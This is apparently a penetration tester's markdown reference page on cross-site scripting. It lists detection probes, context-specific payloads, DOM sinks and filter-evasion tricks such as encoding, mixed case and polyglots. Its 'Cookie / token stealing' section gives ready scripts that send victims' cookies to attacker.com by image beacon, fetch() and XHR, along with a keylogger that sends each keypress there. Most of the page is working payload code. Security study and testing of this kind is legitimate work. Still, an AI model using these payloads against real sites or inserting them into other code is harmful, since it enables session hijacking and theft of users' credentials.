# Cross-Site Scripting (XSS)

Manual XSS payloads, detection, and bypass techniques.

---

## What is it?

Injecting JavaScript (or other client-side code) into a page so it executes in another user's browser. Caused by user input being rendered into HTML / JS / attribute / URL contexts without proper encoding.

---

## Types

| Type | Where the payload lives | Trigger |
|:-----|:------------------------|:--------|
| **Reflected** | URL / form parameter, echoed back in response | Victim clicks a crafted link |
| **Stored** | Saved in DB / file (comments, profile, message) | Any visitor of the page |
| **DOM-based** | Sink in client-side JS (`innerHTML`, `document.write`, `eval`, `location`) | Page processes attacker-controlled DOM |

---

## Detection

Submit one at a time and watch the rendered HTML / JS source:

```html
<script>alert(1)</script>
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
"><svg/onload=alert(1)>
'-alert(1)-'
";alert(1);//
</script><script>alert(1)</script>
```

### Look for

- Your input appearing **unencoded** in the response (`<` stays as `<`, not `&lt;`)
- Different rendering between HTML body, attribute (`<input value="...">`), and JS context (`var x = "...";`)
- `Content-Type` of `text/html` (XSS not exploitable in `application/json` directly)
- Missing or weak `Content-Security-Policy` header

---

## Basic payloads

```html
<!-- Script tag (blocked by most filters / CSP) -->
<script>alert('XSS')</script>

<!-- Event handlers — usually the way in -->
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>
<svg onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<details open ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>

<!-- href / src protocol abuse -->
<a href="javascript:alert('XSS')">Click</a>
<iframe src="javascript:alert('XSS')">
<object data="javascript:alert('XSS')">
<embed src="javascript:alert('XSS')">
```

---

## Context-specific payloads

### Inside an attribute value

```html
<!-- input value="USER_INPUT" -->
" autofocus onfocus=alert(1) x="
"><svg onload=alert(1)>
"><script>alert(1)</script>
```

### Inside a JS string

```js
// var x = "USER_INPUT";
";alert(1);//
";alert(1);var x="
\";alert(1);//
</script><script>alert(1)</script>
```

### Inside a URL parameter (href / src)

```
javascript:alert(1)
javascript:alert(1)//
javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)//>
```

### DOM sink hunting

Look for these in client-side JS:

```js
// Sinks
element.innerHTML = userInput;
document.write(userInput);
eval(userInput);
location = userInput;
location.href = userInput;
setTimeout(userInput, 0);

// Sources (where attacker controls)
location.hash
location.search
document.referrer
window.name
postMessage data
```

---

## Cookie / token stealing

```html
<!-- Image beacon (works even with strict CSP if img-src allows) -->
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>

<!-- fetch() -->
<script>
fetch('http://attacker.com/steal?c='+document.cookie);
</script>

<!-- XHR -->
<script>
var x=new XMLHttpRequest();
x.open('GET','http://attacker.com/steal?c='+document.cookie);
x.send();
</script>

<!-- Form keylogger -->
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/k?='+String.fromCharCode(e.which));
}
</script>
```

`HttpOnly` cookies aren't readable from JS — fall back to session-riding (CSRF-style requests with the victim's cookies attached automatically).

---

## Bypass / filter evasion

| Filter | Bypass |
|:-------|:-------|
| `<script>` blocked | Event handlers: `<img onerror=...>`, `<svg onload=...>` |
| `alert` blocked | `confirm`, `prompt`, `print`, `console.log`, `eval(atob(...))` |
| Quotes blocked | Backticks: `` alert`1` `` |
| Parens blocked | `onerror=alert\`1\`` or `throw onerror=alert,1` |
| Spaces blocked | `/`, `/**/`, tab, newline |
| `(` / `)` blocked | Template literals: `` alert`XSS` `` |
| Keyword filtering | Mixed case, HTML entities, `eval(atob('YWxlcnQoMSk='))` |

```html
<!-- No parens -->
<script>alert`XSS`</script>
<img src=x onerror=alert`1`>

<!-- HTML entity encoding (decoded by browser before JS parse) -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<a href="javascript&colon;alert(1)">x</a>

<!-- Mixed case -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>

<!-- Base64 to hide payload -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- Slash instead of space -->
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```

---

## Polyglot payloads

One payload that fires in many contexts:

```
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

```
'"><img src=x onerror=alert(1)>
```

---

## Quick testing checklist

- [ ] Test every input with `<script>alert(1)</script>` and `"><img src=x onerror=alert(1)>`
- [ ] Test URL parameters, headers (`User-Agent`, `Referer`), and cookies
- [ ] Identify the **context** — HTML body, attribute, JS string, URL
- [ ] Check how the input is encoded on output
- [ ] Look at client-side JS for DOM sinks
- [ ] Check `Content-Security-Policy` — strict CSP can kill inline scripts
- [ ] Try stored locations (comments, profile fields, file names, file uploads)

---

## Resources

- [PortSwigger Web Security Academy — XSS](https://portswigger.net/web-security/cross-site-scripting)
- [PayloadsAllTheThings — XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [XSS Hunter](https://xsshunter.com/)
- [Cure53 HTML5 Security Cheatsheet](https://html5sec.org/)

---

## See Also

- [[Burp_Suite]] — Capture / replay XSS payloads, run Intruder for fuzzing
- [[SQL_Injection]] — The other classic web injection
- [[ffuf]] / [[gobuster]] — Discover hidden parameters that might be vulnerable
